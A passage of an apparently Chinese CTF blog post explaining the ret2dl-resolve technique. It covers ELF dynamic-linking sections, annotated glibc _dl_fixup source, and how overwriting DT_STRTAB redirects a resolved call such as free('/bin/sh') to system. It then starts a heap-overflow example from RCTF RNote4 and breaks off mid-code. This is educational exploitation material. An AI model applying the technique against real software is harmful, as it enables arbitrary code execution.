class="line">LOAD:08049F34                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C                 Elf32_Dyn &lt;1Ah, &lt;8049F0Ch&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54                 Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C                 Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64                 Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C                 Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84                 Elf32_Dyn &lt;2, &lt;10h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F94                 Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C                 Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049FA4                 Elf32_Dyn &lt;12h, &lt;8&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure><p>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针，可以readelf -S fun看一下各个段的地址，会发现这三个section的地址跟在ida所示的地址是一样的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">readelf -S fun</span><br><span class="line">共有 31 个节头，从偏移量 0x17f0 开始：</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 0001a2 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484b4 0004b4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484c8 0004c8 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048504 000504 0000ec 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4  //dynamic</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016e3 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000460 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014b4 00022f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481CC ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;offset aRead - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; "read"</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804821C, 0, 0, 20h, 0, 0&gt; ; "__gmon_start__"</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804821C, 0, 0, 12h, 0, \ ; "__libc_start_main"</span><br><span class="line">LOAD:080481FC                            0&gt;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804821C, \ ; "_IO_stdin_used"</span><br><span class="line">LOAD:0804820C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br></pre></td></tr></table></figure><p>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure></p><h3 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h3><p>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个read。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x080481AC的偏移。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804821C ; ELF String Table</span><br><span class="line">LOAD:0804821C byte_804821C    db 0                    ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804821C                                         ; LOAD:080481EC↑o ...</span><br><span class="line">LOAD:0804821D aLibcSo6        db 'libc.so.6',0</span><br><span class="line">LOAD:08048227 aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 aRead           db 'read',0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B aLibcStartMain  db '__libc_start_main',0</span><br><span class="line">LOAD:0804823B                                         ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:0804824D aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804825C aGlibc20        db 'GLIBC_2.0',0</span><br><span class="line">LOAD:08048266                 align 4</span><br><span class="line">LOAD:08048268                 dd 2, 10002h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:08048280                 dd 0D696910h, 20000h, 40h, 0</span><br></pre></td></tr></table></figure></p><h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048290 ; ELF REL Relocation Table</span><br><span class="line">LOAD:08048290                 Elf32_Rel &lt;8049FFCh, 206h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048298 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048298                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080482A0                 Elf32_Rel &lt;804A010h, 307h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br></pre></td></tr></table></figure><p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></p><h2 id="gilbc2-23-dl-fixup源码分析"><a href="#gilbc2-23-dl-fixup源码分析" class="headerlink" title="gilbc2.23 _dl_fixup源码分析"></a>gilbc2.23 _dl_fixup源码分析</h2><p>glibc源码阅读网站 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61</a><br>glibc源码下载网站 <a href="http://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/glibc/</a></p><p>_dl_fixup函数的两个参数  struct link_map *l , ELFW(Word) reloc _arg都在glibc/elf/link.h中定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* 前几个成员是使用调试器的协议的一部分.</span></span><br><span class="line"><span class="comment">       这与SVR4中使用的格式相同.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* ELF文件中的地址与内存中的地址之间的差异*/</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* 绝对文件名对象.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* 共享对象的动态部分 .dynamic  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 后一个链和前一个链.*/</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We use this macro to refer to ELF types independent of the native wordsize.</span></span><br><span class="line"><span class="comment">   `ElfW(TYPE)' is used in place of `Elf32_TYPE' or `Elf64_TYPE'.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ElfW(type)_ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW(e,w,t)_ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW_1(e,w,t)e##w##t</span></span><br></pre></td></tr></table></figure><p>_dl_fixup 在glibc/elf/dl-runtime.c<br>首先说第一个参数，是一个link_map的指针，它包含了.dynamic的指针，通过这个link_map，_dl_runtime_resolve函数可以访问到.dynamic这个section</p><p>而第二个参数，是当前要调用的导入函数在.rel.plt中的偏移（不过64位的话就直接是index下标），比方说这里，read就是0，__libc_start_main就是1*sizeof(Elf32_Rel)=8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (  </span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS  </span><br><span class="line">    ELF_MACHINE_RUNTIME_FIXUP_ARGS,  </span><br><span class="line"># endif  </span><br><span class="line">    struct link_map *l, ElfW(Word) reloc_arg) &#123;  </span><br><span class="line">    <span class="comment">//获取symtab（存放dynsym的数组）  </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab  </span></span><br><span class="line"><span class="function">        </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//获取strtab(存放符号名的数组)   </span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的rel.plt项   </span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc  </span><br><span class="line">        = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的dynsym   </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;  </span><br><span class="line">    <span class="comment">//指向对应的got表，以便将解析结果写回去   </span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  </span><br><span class="line">    <span class="keyword">lookup_t</span> result;  </span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span>  </span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not </span></span><br><span class="line"><span class="comment">       used don't look in the global scope.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=  </span><br><span class="line">                (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  </span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;  </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)  </span><br><span class="line">                version = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is </span></span><br><span class="line"><span class="comment">        not necessary for objects which cannot be unloaded or when </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>  </span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;  </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();  </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">        <span class="comment">//根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中   </span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,  </span><br><span class="line">                                      version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)  </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//得到结果   </span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,  </span><br><span class="line">                                     sym ? (LOOKUP_VALUE_ADDRESS (result)  </span><br><span class="line">                                            + sym-&gt;st_value) : <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span>  </span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span>  </span><br><span class="line">            &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))  </span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    <span class="comment">//将结果写回到got表中   </span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_dl_fixup函数</strong></p><ul><li>1 _dl_fixup函数首先通过宏D_PTR从用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针</li><li>2 rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel</li><li>3 rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li><li>4 .dynstr + sym-&gt;st_name得出符号名字符串指针</li><li>5 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</li><li>6 调用这个函数</li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>那么，这个怎么去利用呢，有多种利用方式</p><h3 id="伪造-dynsym"><a href="#伪造-dynsym" class="headerlink" title="伪造 .dynsym"></a>伪造 .dynsym</h3><p>即使保护全没开 .dynsym也是不可写的，但可以<br>通过改写.dynamic的DT_STRTAB来伪造ELF String Table，也就是.dynsym<br>这个只有在checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用free(“bin/sh”)（因为只有第一次才会resolve），就等于调用了system(“/bin/sh”)。</p><p>例题就是RCTF的RNote4，题目是一道堆溢出，NO RELRO而且NO PIE溢出到后面的指针可以实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 a1; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a1 = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;a1, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[a1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3 = notes[a1];</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);                      <span class="comment">// heap overflow堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span 